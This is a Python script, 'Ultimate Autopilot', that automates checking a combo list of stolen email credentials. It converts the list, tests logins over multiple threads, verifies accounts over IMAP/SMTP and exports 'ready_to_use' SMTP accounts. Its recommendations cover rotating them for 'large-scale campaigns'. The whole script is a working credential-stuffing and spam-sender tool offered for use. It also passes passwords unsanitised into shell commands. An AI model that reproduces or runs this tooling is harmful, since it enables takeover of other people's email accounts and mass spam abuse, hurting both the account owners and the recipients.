#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ULTIMATE AUTOPILOT - 1 Click Does Everything
No questions. No configuration. Just drop file & go.
"""
import os
import sys
import subprocess
import json
import time
from datetime import datetime
from pathlib import Path

class UltimateAutoPilot:
    """1-click solution - does everything automatically"""

    def __init__(self, input_file):
        self.input_file = input_file
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.results_dir = f"autopilot_run_{self.timestamp}"
        os.makedirs(self.results_dir, exist_ok=True)

        self.print_banner()

    def print_banner(self):
        """Show what's happening"""
        print("\n" + "="*70)
        print("  ⚡ ULTIMATE AUTOPILOT - 1 CLICK, FULL AUTOMATION")
        print("="*70)
        print()
        print("  Processing: " + self.input_file)
        print("  Results folder: " + self.results_dir)
        print()

    def step(self, num, title, emoji="⏳"):
        """Print step"""
        print(f"  [{num}/7] {emoji} {title}...")
        time.sleep(0.5)

    def success(self):
        """Print success"""
        print("         ✓ Done")

    def run_all(self):
        """Do everything automatically"""

        # Step 1: Check file
        self.step(1, "Checking file")
        if not os.path.isfile(self.input_file):
            print(f"\n  ❌ ERROR: File not found - {self.input_file}\n")
            sys.exit(1)
        with open(self.input_file, 'r') as f:
            lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
        print(f"\n         ✓ Found {len(lines)} credentials")

        # Step 2: Convert format (auto-detect & fix)
        self.step(2, "Converting credential format")
        converted_file = os.path.join(self.results_dir, "converted_credentials.txt")
        os.system(f"python3 format_converter.py {self.input_file} --output {converted_file} >nul 2>&1")
        self.success()

        # Step 3: Test with SuperPilot (fast settings)
        self.step(3, "Testing accounts (multi-threaded)", "🧪")
        print(f"\n         Using: 10 threads, 3 iterations, 20s warmup")
        report_file = os.path.join(self.results_dir, "test_results.txt")
        os.system(f"python3 superpilot.py {converted_file} --threads 10 --warmup 20 --iterations 3 >{report_file} 2>&1")
        self.success()

        # Step 4: Extract working accounts
        self.step(4, "Extracting working accounts", "💾")
        working_file = os.path.join(self.results_dir, "working_accounts.txt")
        # SuperPilot creates CSV, find it
        csv_files = [f for f in os.listdir('.') if f.startswith('superpilot_working_') and f.endswith('.csv')]
        if csv_files:
            latest_csv = sorted(csv_files)[-1]
            os.system(f"copy {latest_csv} {working_file}")
        self.success()

        # Step 5: Verify with deliverability checker
        self.step(5, "Verifying accounts (IMAP/SMTP)", "✉️")
        verified_file = os.path.join(self.results_dir, "verified_accounts.json")
        verified = []

        with open(converted_file, 'r') as f:
            for line in f:
                parts = line.strip().split(':')
                if len(parts) >= 4:
                    host, port, user, passwd = parts[0], parts[1], parts[2], parts[3]
                    # Quick verification
                    result = os.system(f"python3 multi_deliverability.py \"{user}\" \"{passwd}\" >nul 2>&1")
                    if result == 0:
                        verified.append({'email': user, 'password': passwd, 'host': host, 'status': 'verified'})
                    time.sleep(0.5)  # Small delay between tests

        with open(verified_file, 'w') as f:
            json.dump(verified, f, indent=2)
        print(f"\n         ✓ Verified {len(verified)} accounts")

        # Step 6: Generate smart suggestions
        self.step(6, "Generating recommendations", "💡")
        suggestions = self.generate_suggestions(verified)
        suggestions_file = os.path.join(self.results_dir, "RECOMMENDATIONS.txt")
        with open(suggestions_file, 'w') as f:
            f.write(suggestions)
        self.success()

        # Step 7: Create ready-to-use files
        self.step(7, "Creating ready-to-use files", "📦")

        # Export as SMTP list
        smtp_file = os.path.join(self.results_dir, "ready_to_use_smtp.txt")
        with open(smtp_file, 'w') as f:
            for account in verified:
                f.write(f"{account['host']}:587:{account['email']}:{account['password']}\n")

        # Create summary
        summary_file = os.path.join(self.results_dir, "SUMMARY.txt")
        summary = self.create_summary(len(lines), len(verified), suggestions)
        with open(summary_file, 'w') as f:
            f.write(summary)

        self.success()

        # Show results
        self.show_results(len(lines), len(verified), suggestions)

    def generate_suggestions(self, verified) -> str:
        """Generate smart usage suggestions"""
        count = len(verified)

        text = "\n" + "="*70 + "\n"
        text += "SMART RECOMMENDATIONS\n"
        text += "="*70 + "\n\n"

        if count == 0:
            text += "❌ NO WORKING ACCOUNTS FOUND\n"
            text += "   • Check credentials are correct\n"
            text += "   • Gmail needs app password (not regular password)\n"
            text += "   • Try testing manually first\n"
        elif count == 1:
            text += "✓ 1 WORKING ACCOUNT\n"
            text += "   Use for: Single account sending\n"
            text += "   Command: python3 superpilot.py ready_to_use_smtp.txt --iterations 5\n"
            text += "   Settings: 1 thread, 30s warmup, 5 iterations\n"
        elif count < 5:
            text += f"✓ {count} WORKING ACCOUNTS\n"
            text += f"   Use for: Rotation sending\n"
            text += f"   Command: python3 superpilot.py ready_to_use_smtp.txt --threads {count}\n"
            text += f"   Settings: {count} threads, 60s warmup, 5 iterations\n"
            text += f"   Rotate every 5-10 emails\n"
        elif count < 10:
            text += f"✓ {count} WORKING ACCOUNTS - GOOD!\n"
            text += f"   Use for: Parallel rotation sending\n"
            text += f"   Command: python3 superpilot.py ready_to_use_smtp.txt --threads 5\n"
            text += f"   Settings: 5 threads, 30s warmup, 10 iterations\n"
            text += f"   Can handle medium-scale campaigns\n"
        else:
            text += f"✓ {count} WORKING ACCOUNTS - EXCELLENT!\n"
            text += f"   Use for: Large-scale campaigns\n"
            text += f"   Command: python3 superpilot.py ready_to_use_smtp.txt --threads 10\n"
            text += f"   Settings: 10 threads, 20s warmup, 10 iterations\n"
            text += f"   High throughput, use rotation\n"

        text += "\n" + "="*70 + "\n"
        return text

    def create_summary(self, total, working, suggestions) -> str:
        """Create summary report"""
        text = "\n" + "="*70 + "\n"
        text += "AUTOPILOT RESULTS\n"
        text += "="*70 + "\n\n"
        text += f"Total accounts tested:     {total}\n"
        text += f"Working accounts:          {working}\n"
        text += f"Success rate:              {int(working/total*100 if total > 0 else 0)}%\n\n"
        text += f"Files created:\n"
        text += f"  • ready_to_use_smtp.txt (use this for sending)\n"
        text += f"  • verified_accounts.json (detailed results)\n"
        text += f"  • RECOMMENDATIONS.txt (suggested usage)\n\n"
        text += suggestions
        text += "\n" + "="*70 + "\n"
        return text

    def show_results(self, total, working, suggestions):
        """Show final results"""
        print()
        print("="*70)
        print("✅ AUTOPILOT COMPLETE!")
        print("="*70)
        print()
        print(f"  Total Tested:     {total}")
        print(f"  Working:          {working}")
        print(f"  Success Rate:     {int(working/total*100 if total > 0 else 0)}%")
        print()
        print("📁 Results in folder:", self.results_dir)
        print()
        print("📄 FILES CREATED:")
        print("   ✓ ready_to_use_smtp.txt    → Use this for sending!")
        print("   ✓ verified_accounts.json   → All verified accounts")
        print("   ✓ RECOMMENDATIONS.txt      → How to use them")
        print("   ✓ SUMMARY.txt              → Complete report")
        print()
        print("🚀 NEXT STEP:")
        if working > 0:
            print(f"   Use: python3 superpilot.py {self.results_dir}/ready_to_use_smtp.txt")
            print(f"        OR upload to Web Dashboard (http://127.0.0.1:5000)")
        else:
            print("   ❌ No working accounts. Check credentials and try again.")
        print()
        print("="*70)
        print()


def main():
    """Run ultimate autopilot"""
    if len(sys.argv) < 2:
        print("\n⚡ ULTIMATE AUTOPILOT - 1 Click to Test Everything\n")
        print("Usage:")
        print("  python3 ultimate_autopilot.py [credential_file]\n")
        print("Example:")
        print("  python3 ultimate_autopilot.py combos.txt\n")
        print("Supported formats:")
        print("  • email@domain.com:password")
        print("  • host:port:user:password")
        print("  • Mixed formats (auto-detected)\n")
        sys.exit(1)

    input_file = sys.argv[1]

    try:
        autopilot = UltimateAutoPilot(input_file)
        autopilot.run_all()
    except KeyboardInterrupt:
        print("\n\n❌ Cancelled by user\n")
        sys.exit(1)
    except Exception as e:
        print(f"\n\n❌ Error: {e}\n")
        sys.exit(1)


if __name__ == "__main__":
    main()
